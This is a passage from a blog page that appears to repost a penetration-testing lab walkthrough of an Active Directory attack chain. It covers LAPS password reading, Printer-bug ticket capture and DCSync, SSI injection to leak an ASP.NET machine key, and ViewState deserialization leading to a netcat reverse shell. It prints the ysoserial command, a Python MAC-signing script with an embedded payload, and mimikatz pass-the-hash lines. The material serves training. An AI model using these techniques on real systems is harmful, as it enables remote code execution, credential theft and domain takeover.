+<p>This will grant us access to the LAPS password of the computer object, which is what can be seen by running “Get-DomainComputer uat01” after we modified the permission to apply on descending objects as well:</p>
+<p><img src="https://assets.ine.com/cybersecurity-lab-images/4a30ae77-99ca-4726-8791-f79bb1729066/image47.png" srcset="/img/loading.gif"></p>
+<p><strong>NOTE</strong> - This password value changes dynamically to another random value, therefore it will be different in your case.</p>
+<p>Now we can use that password to login (<strong>and RDP</strong>) as the “Administrator” of the UAT01 server. Having compromised UAT01 with administrative privileges, we can look again in the computer object and see its permissions and assignments. We can use BloodHound’s data representation this time:</p>
+<p><img src="https://assets.ine.com/cybersecurity-lab-images/4a30ae77-99ca-4726-8791-f79bb1729066/image48.png" srcset="/img/loading.gif"></p>
+<p>The server is trusted for Unconstrained delegation. We can abuse Unconstrained delegation to perform the Printer bug and obtain a Kerberos ticket of the Domain Controller, which can then be used to perform DCSync. To do that (<strong>inside UAT01</strong>), we need to run Rubeus in monitor mode to capture all incoming tickets and export them to a file:</p>
+<p><img src="https://assets.ine.com/cybersecurity-lab-images/4a30ae77-99ca-4726-8791-f79bb1729066/image49.png" srcset="/img/loading.gif"></p>
+<p>It is necessary to execute this with SYSTEM rights, else Rubeus won’t be able to export the tickets. Simply running in administrative shell will not be enough because the environment has been hardened to not allow assignment of certain privileges so requesting “SeDebugPrivilege” will not be granted even to administrators. In this case, any functionality similar to PsExec will do the trick with the escalation.</p>
+<p>Once Rubeus is configured, execute the Printer bug (note that a domain user is required to trigger it this is why it was executed from a shell running as Lisa, so don’t attempt to run as the local administrator of UAT01!) It may be necessary that Lisa is added to local administrators to perform the logon through “runas”):</p>
+<p><img src="https://assets.ine.com/cybersecurity-lab-images/4a30ae77-99ca-4726-8791-f79bb1729066/image50.png" srcset="/img/loading.gif"></p>
+<p>With the extracted ticket, we can pass-the-ticket and verify that we have a valid one for bank-dc:</p>
+<p><img src="https://assets.ine.com/cybersecurity-lab-images/4a30ae77-99ca-4726-8791-f79bb1729066/image51.png" srcset="/img/loading.gif"></p>
+<p>Finally, execute DCSync and get the hash of the Administrator:</p>
+<p><img src="https://assets.ine.com/cybersecurity-lab-images/4a30ae77-99ca-4726-8791-f79bb1729066/image52.png" srcset="/img/loading.gif"></p>
+<h3 id="Task-5-Scenario-5-Shadow-Principals-smallcaps-1"><a href="#Task-5-Scenario-5-Shadow-Principals-smallcaps-1" class="headerlink" title="Task 5: Scenario 5 - Shadow Principals{.smallcaps}"></a>Task 5: Scenario 5 - Shadow Principals{.smallcaps}</h3><p>During the enumeration phase, we discover that there is an one-way trust set to “protect.bank” and a bidirectional trust with “trusted.corp”:</p>
+<p><img src="https://assets.ine.com/cybersecurity-lab-images/4a30ae77-99ca-4726-8791-f79bb1729066/image53.png" srcset="/img/loading.gif"></p>
+<p>A quick ping scan detects that protect.bank is resolved and a machine is answering our requests:</p>
+<p><img src="https://assets.ine.com/cybersecurity-lab-images/4a30ae77-99ca-4726-8791-f79bb1729066/image54.png" srcset="/img/loading.gif"></p>
+<p>Performing a port scan against the machine, reveals a Windows server, with open ports that disclose that it is most likely a Domain Controller. Additionally, it has port 80 open. By connecting to it with a browser, we discover the following application:</p>
+<p><img src="https://assets.ine.com/cybersecurity-lab-images/4a30ae77-99ca-4726-8791-f79bb1729066/image55.png" srcset="/img/loading.gif"></p>
+<p>Going through the source code of the application an interesting to us comment is identified and additionally, based on some of the parameters (e.g. __VIEWSTATE), we can tell that this is ASP.NET web application:</p>
+<p><img src="https://assets.ine.com/cybersecurity-lab-images/4a30ae77-99ca-4726-8791-f79bb1729066/image56.png" srcset="/img/loading.gif"></p>
+<p>We have an application, which appears to offer file uploading functionality, filtering on a blacklist of file types that cannot be uploaded. The process now involves a trial and error approach, where we will attempt to upload different file types and observe the output to see which ones are allowed to be uploaded. In fact, to get anything interesting we will aim to upload files which are triggered by Server Side loading (this feature must be enabled on the remote server, which allows for certain execution e.g. file include). ViewState deserialization is our best bet here. For that though, we will need the machine key that is used for encrypting ViewState. The machine key may be retrieved trough an SSI attack (<a target="_blank" rel="noopener" href="https://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection">https://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection</a>).</p>
+<p>Let’s upload a file containing the following code (filetype:.shtml) that attempts to read and return to us the content of the file web.config through SSI (“....&quot; in the command below is going back in directories because it appears the uploaded files are placed in a nested folder and not in the same directory as the file with the upload function itself - this was discovered by uploading a document which presents back to us the location it was placed in):</p>
+<figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--#include file=&quot;..\..\web.config&quot; --&gt;</span><br></code></pre></div></td></tr></table></figure>
+
+<p>Now, let’s use burp and start sending that.</p>
+<p><strong>Note:</strong> that burp is executed through an attacking Linux machine. Consider that also port proxying through workstastion01 may be necessary to reach the server from the attacking Linux machine. The same for any reverse shells too!):</p>
+<p>“shtml” is allowed, and the response provides us a link to the file on the server:</p>
+<p>Request:</p>
+<p><img src="https://assets.ine.com/cybersecurity-lab-images/4a30ae77-99ca-4726-8791-f79bb1729066/image57.png" srcset="/img/loading.gif"></p>
+<p>Response:</p>
+<p><img src="https://assets.ine.com/cybersecurity-lab-images/4a30ae77-99ca-4726-8791-f79bb1729066/image58.png" srcset="/img/loading.gif"></p>
+<p>Let’s access the file and observe the response from the server (which includes the content of web.config):</p>
+<p><img src="https://assets.ine.com/cybersecurity-lab-images/4a30ae77-99ca-4726-8791-f79bb1729066/image59.png" srcset="/img/loading.gif"></p>
+<p>The interesting part from the output of the file is the “machineKey” parameter. This key is used in the server side checks of the MAC for the “__VIEWSTATE” parameter in the requests to the server. With this key, essentially, we can create our own serialized object and replace the original value of “VIEWSTATE” to ours, which can trigger code execution when deserialized.</p>
+<p>What we want to trigger is a reverse shell connecting back to us. We’ll use a windows binary version of netcat, however, this can be any stager for frameworks like Metasploit etc. Uploading the file returns the location it was placed in:</p>
+<p><img src="https://assets.ine.com/cybersecurity-lab-images/4a30ae77-99ca-4726-8791-f79bb1729066/image60.png" srcset="/img/loading.gif"></p>
+<p>Note that this file was uploaded from workstation01, therefore the ‘stored’ location on the server, refers to that IP address 172.16.80.100, which is different than the IP address of the uploaded .shtml file earlier, which was uploaded from our linux machine.</p>
+<p>Now that we have netcat uploaded to the server, we need to generate serialized object and utilize the machine key to perform MAC signing of the serialized object. Our payload will be the following command which creates a reverse shell back to workstation01 on port 2222:</p>
+<figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">C</span>:\inetpub/wwwroot/files/<span class="hljs-number">172.16.80.100</span>/bdca<span class="hljs-number">0</span>e<span class="hljs-number">54</span>-<span class="hljs-number">477</span>a-<span class="hljs-number">49</span>e<span class="hljs-number">1</span>-<span class="hljs-number">9</span>cf<span class="hljs-number">4</span>-cfc<span class="hljs-number">0</span>b<span class="hljs-number">4</span>ea<span class="hljs-number">9931</span>.exe <span class="hljs-number">172.16.80.100</span> <span class="hljs-number">2222</span> -e cmd.exe<br></code></pre></div></td></tr></table></figure>
+
+<p>To create a serialized object, we’ll use “ysoserial” and pass it the command:</p>
+<p><img src="https://assets.ine.com/cybersecurity-lab-images/4a30ae77-99ca-4726-8791-f79bb1729066/image61.png" srcset="/img/loading.gif"></p>
+<p>We’ll then create a python file that can perform the MAC signing with the machineKey and paste the serialized object in it. This is the final version of the script:</p>
+<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3 </span><br><span class="hljs-keyword">import</span> hashlib <br><span class="hljs-keyword">import</span> base64 <br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">C:\inetpub/wwwroot/files/172.16.80.100/bdca0e54-477a-49e1-9cf4-cfc0b4ea9931.exe 172.16.80.100 2222 -e cmd.exe </span><br><span class="hljs-string"></span><br><span class="hljs-string">#Generate deserialization gadget by ysoserial.net</span><br><span class="hljs-string">ysoserial.exe -o base64 -g TypeConfuseDelegate -f LosFormatter -c &quot;C:\inetpub/wwwroot/files/172.16.80.100/bdca0e54-477a-49e1-9cf4-cfc0b4ea9931.exe 172.16.80.100 2222 -e cmd.exe&quot; </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>serialized_data = <span class="hljs-string">&#x27;/wEyqRIAAQAAAP////8BAAAAAAAAAAwCAAAASVN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkFAQAAAIQBU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuU29ydGVkU2V0YDFbW1N5c3RlbS5TdHJpbmcsIG1zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OV1dBAAAAAVDb3VudAhDb21wYXJlcgdWZXJzaW9uBUl0ZW1zAAMABgiNAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkNvbXBhcmlzb25Db21wYXJlcmAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQgCAAAAAgAAAAkDAAAAAgAAAAkEAAAABAMAAACNAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkNvbXBhcmlzb25Db21wYXJlcmAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQEAAAALX2NvbXBhcmlzb24DIlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIJBQAAABEEAAAAAgAAAAYGAAAAcC9jIEM6XGluZXRwdWIvd3d3cm9vdC9maWxlcy8xNzIuMTYuODAuMTAwL2JkY2EwZTU0LTQ3N2EtNDllMS05Y2Y0LWNmYzBiNGVhOTkzMS5leGUgMTcyLjE2LjgwLjEwMCAyMjIyIC1lIGNtZC5leGUGBwAAAANjbWQEBQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQdtZXRob2QwB21ldGhvZDEDAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5L1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyCQgAAAAJCQAAAAkKAAAABAgAAAAwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5BwAAAAR0eXBlCGFzc2VtYmx5BnRhcmdldBJ0YXJnZXRUeXBlQXNzZW1ibHkOdGFyZ2V0VHlwZU5hbWUKbWV0aG9kTmFtZQ1kZWxlZ2F0ZUVudHJ5AQECAQEBAzBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkGCwAAALACU3lzdGVtLkZ1bmNgM1tbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XSxbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XSxbU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MsIFN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQYMAAAAS21zY29ybGliLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49Yjc3YTVjNTYxOTM0ZTA4OQoGDQAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5Bg4AAAAaU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MGDwAAAAVTdGFydAkQAAAABAkAAAAvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIHAAAABE5hbWUMQXNzZW1ibHlOYW1lCUNsYXNzTmFtZQlTaWduYXR1cmUKU2lnbmF0dXJlMgpNZW1iZXJUeXBlEEdlbmVyaWNBcmd1bWVudHMBAQEBAQADCA1TeXN0ZW0uVHlwZVtdCQ8AAAAJDQAAAAkOAAAABhQAAAA+U3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MgU3RhcnQoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykGFQAAAD5TeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcyBTdGFydChTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQgAAAAKAQoAAAAJAAAABhYAAAAHQ29tcGFyZQkMAAAABhgAAAANU3lzdGVtLlN0cmluZwYZAAAAK0ludDMyIENvbXBhcmUoU3lzdGVtLlN0cmluZywgU3lzdGVtLlN0cmluZykGGgAAADJTeXN0ZW0uSW50MzIgQ29tcGFyZShTeXN0ZW0uU3RyaW5nLCBTeXN0ZW0uU3RyaW5nKQgAAAAKARAAAAAIAAAABhsAAABxU3lzdGVtLkNvbXBhcmlzb25gMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0JDAAAAAoJDAAAAAkYAAAACRYAAAAKCw==&#x27;</span><br><br>payload = base64.b64decode(serialized_data) <br><br><span class="hljs-comment"># Get machine key by uploading .shtml file (Server Side Include) </span><br>validation_key = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&#x27;b07b0f97365416288cf0247cffdf135d25f6be87&#x27;</span>) <br><br>mac = hashlib.md5(payload + validation_key + <span class="hljs-string">b&#x27;\x00\x00\x00\x00&#x27;</span>).digest() <br>payload = base64.b64encode(payload + mac).decode() <br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>)<br><span class="hljs-built_in">print</span>(payload) <br></code></pre></div></td></tr></table></figure>
+
+<p>Execute the python script from the attacking Linux machine (a solution like a port/socks proxy will be required) to get the final MAC signed serialized object:</p>
+<p><img src="https://assets.ine.com/cybersecurity-lab-images/4a30ae77-99ca-4726-8791-f79bb1729066/image62.png" srcset="/img/loading.gif"></p>
+<p>Now, we need to start a listener on workstation01 on port 2222 (as defined in the reverse shell call):</p>
+<p><img src="https://assets.ine.com/cybersecurity-lab-images/4a30ae77-99ca-4726-8791-f79bb1729066/image63.png" srcset="/img/loading.gif"></p>
+<p>With the listener started, we need to create a new file upload request (just select any file that can be uploaded, at this stage it doesn’t matter which one), and replace the value of “__VIEWSTATE” to that generated by the python script:</p>
+<p><img src="https://assets.ine.com/cybersecurity-lab-images/4a30ae77-99ca-4726-8791-f79bb1729066/image64.png" srcset="/img/loading.gif"></p>
+<p>When the request is submitted, the server will return an error – this is expected:</p>
+<p><img src="https://assets.ine.com/cybersecurity-lab-images/4a30ae77-99ca-4726-8791-f79bb1729066/image65.png" srcset="/img/loading.gif"></p>
+<p>However, if you look at our listening shell, we have successfully received a reverse shell:</p>
+<p><img src="https://assets.ine.com/cybersecurity-lab-images/4a30ae77-99ca-4726-8791-f79bb1729066/image66.png" srcset="/img/loading.gif"></p>
+<p>It appears that we are running in the context of a service account. To escalate our privileges, we will use <a target="_blank" rel="noopener" href="https://github.com/itm4n/PrintSpoofer">PrintSpoofer</a>. Compile for 64bits and upload the solution to Protect-DC. Then, you can use PrintSpoofer, for example, as follows (in conjunction with a bind tcp MSF executable).</p>
+<p><img src="https://assets.ine.com/cybersecurity-lab-images/4a30ae77-99ca-4726-8791-f79bb1729066/image76.jpg" srcset="/img/loading.gif"></p>
+<p>We successfully gained SYSTEM rights on “protect-dc”.</p>
+<p>What we knew from before is that the production forest “els.bank” had one-way outbound trust to “protect.bank”. This means that principals from “protect.bank” are trusted by “els.bank”. This one-way trust is often employed by Bastion forests, which are used to manage production forests through Shadow principals. To check if this is the case and if any account in “protect.bank” has elevated rights through Shadow principals in “els.bank”, we’ll run the following command:</p>
+<p><img src="https://assets.ine.com/cybersecurity-lab-images/4a30ae77-99ca-4726-8791-f79bb1729066/image72.png" srcset="/img/loading.gif"></p>
+<p>Indeed, it appears that the user “Administrator” has that privilege. Now our task is to compromise that account. There are multiple ways to do that from SYSTEM rights:</p>
+<ul>
+<li><p>  Dump NTDS of the “protect.bank” domain</p>
+</li>
+<li><p>  Utilize Mimikatz-like functionality to extract stored password hashes/plain text credentials in memory</p>
+</li>
+</ul>
+<p>We could of course choose either of those methods, the second one however relies on the fact that the Administrator’s account must have connected after the last reboot (and is not member of the group ‘Protected users’ of “protect.bank”). We also discovered that the directory “C:\users\Administrator\Desktop” contains a file “lsass.dmp”, which in fact looks like a mini-dump output of lsass. This is likely a leftover file from perhaps debugging actions by the administrator. Instead of taking any of the 2 approaches mentioned above, we download the file and parse it offline with Mimikatz to verify whether this was indeed a memory dump of the lsass process:</p>
+<p><img src="https://assets.ine.com/cybersecurity-lab-images/4a30ae77-99ca-4726-8791-f79bb1729066/image73.png" srcset="/img/loading.gif"></p>
+<p>Parsing it indeed returns the password hash of the account “Administrator” in “protect.bank”. Using the password hash, we can perform any hash related authentication abuse to login as the account “Administrator” to “Protect-DC”.</p>
+<p>Example from metasploit:</p>
+<figure class="highlight vim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vim">mimikatz # sekurls<span class="hljs-variable">a:</span>:pth /user:Administrator /domain:protect.bank /rc4:<span class="hljs-symbol">&lt;RC4&gt;</span> /run:notepad.<span class="hljs-keyword">exe</span><br>steal_token <span class="hljs-symbol">&lt;NOTEPAD_PID&gt;</span><br><span class="hljs-keyword">shell</span><br></code></pre></div></td></tr></table></figure>
+
+<p>Once logged on, we can verify that the account has access to “els.bank” through the previously discovered Shadow Principal configuration:</p>
+<p><img src="https://assets.ine.com/cybersecurity-lab-images/4a30ae77-99ca-4726-8791-f79bb1729066/image74.png" srcset="/img/loading.gif"></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/killchains/">killchains</a>
+                    
+                  </div>
+                
+              </div>
+              
+                
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/06/22/%E6%94%BB%E5%87%BB%E9%93%BE%E5%9B%9B%EF%BC%9A%E5%9F%9F%E6%B8%97%E9%80%8F%E6%A1%88%E4%BE%8B%E4%B8%80/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">攻击链四：域渗透案例一</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/06/19/%E6%94%BB%E5%87%BB%E9%93%BE%E4%B8%89%EF%BC%9AH3C-SecParh%E5%A0%A1%E5%9E%92%E6%9C%BA-data-provider-php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
+                        <span class="hidden-mobile">攻击链三：H3C SecParh堡垒机 data_provider.php 远程命令执行</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+            
+
+                
+                  <a id="scroll-top-button" href="#" role="button">
+                    <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+                  </a>
+                  
+
+                    
+                      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+                        
+
+                          
+      </main>
+
+      <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://whale3070.github.io/" target="_blank" rel="nofollow noopener"><span>Whale3070</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+    </body>
+
+  </html>
